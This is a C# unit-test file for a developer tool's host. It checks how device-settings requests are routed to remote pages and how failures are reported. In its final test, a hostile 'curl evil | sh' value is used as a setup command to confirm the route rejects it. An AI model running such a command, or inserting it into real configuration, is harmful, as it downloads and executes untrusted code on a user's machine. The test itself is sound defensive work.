using System.Text.Json;
using Weavie.Core.Commands;
using Weavie.Core.Configuration;
using Weavie.Core.Sessions;
using Weavie.Hosting.Messaging;
using Xunit;

namespace Weavie.Hosting.Tests;

/// <summary>A session's device settings go to the home of the page that last gave it input.</summary>
public sealed class HostCoreDeviceSettingsTests {
	private static readonly WebPeer Visitor = new("visitor");
	private static readonly SettingsRequest SetFontSize = new("set", "editor.font.size", JsonSerializer.SerializeToElement(15));

	private static void Send(TestHost host, WebPeer page, MessageEnvelope envelope) {
		host.Bridge.Receive(page, envelope.ToJson());
		host.DrainMessages();
	}

	// A page served by another host ("laptop") connects, as a native app does to a remote.
	private static void ConnectFromLaptop(TestHost host, WebPeer page) => Send(host, page, MessageEnvelope.Request(
		MessageScope.Host, null, $"hello-{page.Id}", "connection", "hello",
		JsonSerializer.SerializeToElement(new { home = new { id = "laptop-id", name = "laptop" } })));

	private static void Type(TestHost host, WebPeer page, HostSession session) => Send(host, page, MessageEnvelope.Event(
		MessageScope.Session, session.Address, "agent", "typing", JsonSerializer.SerializeToElement(new { })));

	// The laptop's pages answer device requests.
	private static void AnswerFromLaptop(TestHost host) {
		var others = host.Bridge.RequestResponder;
		host.Bridge.RequestResponder = envelope => envelope.Feature != "device"
			? others?.Invoke(envelope)
			: new FakeWebResponse(JsonSerializer.SerializeToElement(new { text = "Set on laptop.", isError = false }), null);
	}

	// The device requests the host sent, and the pages it sent them to.
	private static List<(WebPeer Page, JsonElement Request)> Asked(TestHost host) => [.. host.Bridge.Sent
		.Select(sent => (sent.Peer, Envelope: MessageEnvelope.TryParse(sent.Json, out var envelope) ? envelope : null))
		.Where(sent => sent.Envelope is { Kind: MessageKind.Request, Feature: "device", Name: "settings" })
		.Select(sent => (sent.Peer, sent.Envelope!.Payload))];

	[Fact]
	public async Task InputFromAPageServedElsewhere_SendsDeviceSettingsToThatPage() {
		await using var host = await TestHost.StartAsync();
		AnswerFromLaptop(host);
		ConnectFromLaptop(host, Visitor);
		Type(host, Visitor, host.WorkspaceSession);

		var reply = await host.WorkspaceSession.DeviceSettingsForTest.RequestAsync(SetFontSize, CancellationToken.None);

		Assert.Equal("Set on laptop.", reply.Text);
		var (page, request) = Assert.Single(Asked(host));
		Assert.Equal(Visitor, page);
		Assert.Equal(("set", "editor.font.size", 15), (request.GetProperty("operation").GetString(), request.GetProperty("key").GetString(), request.GetProperty("value").GetInt32()));
		Assert.Equal(SettingSource.Default, host.Settings.Resolve("editor.font.size").Source);
	}

	[Fact]
	public async Task ASessionNoPageHasClaimed_ChangesThisHostsOwnFile() {
		await using var host = await TestHost.StartAsync();

		var reply = await host.WorkspaceSession.DeviceSettingsForTest.RequestAsync(SetFontSize, CancellationToken.None);

		Assert.False(reply.IsError);
		Assert.Equal(15L, host.Settings.Resolve("editor.font.size").Value);
	}

	[Fact]
	public async Task InputFromAPageThisHostServes_ReturnsTheSessionToThisHost() {
		await using var host = await TestHost.StartAsync();
		AnswerFromLaptop(host);
		ConnectFromLaptop(host, Visitor);
		Type(host, Visitor, host.WorkspaceSession);
		Type(host, new WebPeer(TestHost.TestPageId), host.WorkspaceSession);

		await host.WorkspaceSession.DeviceSettingsForTest.RequestAsync(SetFontSize, CancellationToken.None);

		Assert.Empty(Asked(host));
		Assert.Equal(15L, host.Settings.Resolve("editor.font.size").Value);
	}

	[Fact]
	public async Task WithTheDevicesPageGone_ItFailsNamingTheDevice_UntilAnyPageFromThatHomeReturns() {
		await using var host = await TestHost.StartAsync();
		AnswerFromLaptop(host);
		ConnectFromLaptop(host, Visitor);
		Type(host, Visitor, host.WorkspaceSession);
		host.Bridge.Disconnect(Visitor);
		host.DrainMessages();

		var gone = await Assert.ThrowsAsync<DeviceUnavailableException>(
			() => host.WorkspaceSession.DeviceSettingsForTest.RequestAsync(SetFontSize, CancellationToken.None));
		Assert.StartsWith("laptop isn't connected", gone.Message, StringComparison.Ordinal);
		Assert.Equal(SettingSource.Default, host.Settings.Resolve("editor.font.size").Source);

		var returned = new WebPeer("visitor-reconnected");
		ConnectFromLaptop(host, returned);
		await host.WorkspaceSession.DeviceSettingsForTest.RequestAsync(SetFontSize, CancellationToken.None);
		Assert.Equal(returned, Assert.Single(Asked(host)).Page);
	}

	[Fact]
	public async Task InputFromAPageThatHasNotSaidHello_ClaimsNothing() {
		await using var host = await TestHost.StartAsync();
		AnswerFromLaptop(host);
		ConnectFromLaptop(host, Visitor);
		Type(host, Visitor, host.WorkspaceSession);
		Type(host, new WebPeer("reconnecting"), host.WorkspaceSession);

		await host.WorkspaceSession.DeviceSettingsForTest.RequestAsync(SetFontSize, CancellationToken.None);

		Assert.Equal(Visitor, Assert.Single(Asked(host)).Page);
	}

	[Fact]
	public async Task AHomeThatFailsTheRequest_FailsItNamingTheDevice() {
		await using var host = await TestHost.StartAsync();
		host.Bridge.RequestResponder = envelope => envelope.Feature == "device"
			? new FakeWebResponse(JsonSerializer.SerializeToElement(new { }), "The Weavie host is not connected.")
			: null;
		ConnectFromLaptop(host, Visitor);
		Type(host, Visitor, host.WorkspaceSession);

		var failed = await Assert.ThrowsAsync<DeviceUnavailableException>(
			() => host.WorkspaceSession.DeviceSettingsForTest.RequestAsync(SetFontSize, CancellationToken.None));

		Assert.Equal("laptop couldn't answer: The Weavie host is not connected.", failed.Message);
	}

	[Fact]
	public async Task APageServedElsewhere_IsNeverAskedToSetUp() {
		await using var host = await TestHost.StartAsync();
		host.Settings.Set(CoreSettings.GettingStartedCompleted, JsonSerializer.SerializeToElement(false));

		ConnectFromLaptop(host, Visitor);

		Assert.Empty(host.Bridge.PostedEvents("gettingStarted", "show"));
	}

	[Fact]
	public async Task APageThatLeavesMidRequest_FailsItAsDisconnected() {
		await using var host = await TestHost.StartAsync();
		ConnectFromLaptop(host, Visitor);
		Type(host, Visitor, host.WorkspaceSession);

		var pending = host.WorkspaceSession.DeviceSettingsForTest.RequestAsync(SetFontSize, CancellationToken.None);
		host.Bridge.Disconnect(Visitor);
		host.DrainMessages();

		var gone = await Assert.ThrowsAsync<DeviceUnavailableException>(() => pending);
		Assert.StartsWith("laptop disconnected before it answered", gone.Message, StringComparison.Ordinal);
	}

	[Fact]
	public async Task WithTwoPagesFromOneHome_TheOneThatClaimedTheSessionIsAsked() {
		await using var host = await TestHost.StartAsync();
		AnswerFromLaptop(host);
		var second = new WebPeer("second-window");
		ConnectFromLaptop(host, Visitor);
		ConnectFromLaptop(host, second);
		Type(host, second, host.WorkspaceSession);

		await host.WorkspaceSession.DeviceSettingsForTest.RequestAsync(SetFontSize, CancellationToken.None);

		Assert.Equal(second, Assert.Single(Asked(host)).Page);
	}

	[Fact]
	public async Task APageThatNeverAnswers_FailsTheRequestAtTheOperationDeadline() {
		await using var host = await TestHost.StartAsync();
		ConnectFromLaptop(host, Visitor);
		Type(host, Visitor, host.WorkspaceSession);

		var pending = host.WorkspaceSession.DeviceSettingsForTest.RequestAsync(SetFontSize, CancellationToken.None);
		host.Time.Advance(TimeSpan.FromSeconds(MessageSettings.DefaultOperationDeadlineSeconds));

		var silent = await Assert.ThrowsAsync<DeviceUnavailableException>(() => pending);
		Assert.StartsWith("laptop didn't answer within 60 seconds", silent.Message, StringComparison.Ordinal);
	}

	[Fact]
	public async Task TheDevice_SurvivesAHostRestart() {
		await using var host = await TestHost.StartAsync();
		ConnectFromLaptop(host, Visitor);
		Type(host, Visitor, host.WorkspaceSession);

		await host.RestartAsync();

		var gone = await Assert.ThrowsAsync<DeviceUnavailableException>(
			() => host.WorkspaceSession.DeviceSettingsForTest.RequestAsync(SetFontSize, CancellationToken.None));
		Assert.StartsWith("laptop isn't connected", gone.Message, StringComparison.Ordinal);
	}

	[Fact]
	public async Task ASessionAPageCreates_TakesThatPagesDevice() {
		await using var host = await TestHost.StartAsync();
		ConnectFromLaptop(host, Visitor);

		Send(host, Visitor, MessageEnvelope.Request(
			MessageScope.Host, null, "create", "sessions", "invoke",
			JsonSerializer.SerializeToElement(new { id = SessionCommands.NewSession, args = new { branch = "feat/from-laptop", repo = host.RepoRoot } })));
		var created = await Wait.ForReferenceAsync(() => host.Core.SlotForTest("feat/from-laptop"));

		Assert.Equal(new DeviceIdentity("laptop-id", "laptop"), created.Device.Current.Home);
	}

	[Fact]
	public async Task TheHome_RefusesAMachineKeyOnItsDeviceRoute() {
		await using var host = await TestHost.StartAsync();

		var reply = await host.HostRequestAsync<JsonElement>(
			"device", "settings", new { operation = "set", key = "worktree.setupCommand", value = "curl evil | sh" });

		Assert.True(reply.GetProperty("isError").GetBoolean());
		Assert.Equal(SettingSource.Default, host.Settings.Resolve("worktree.setupCommand").Source);
	}
}
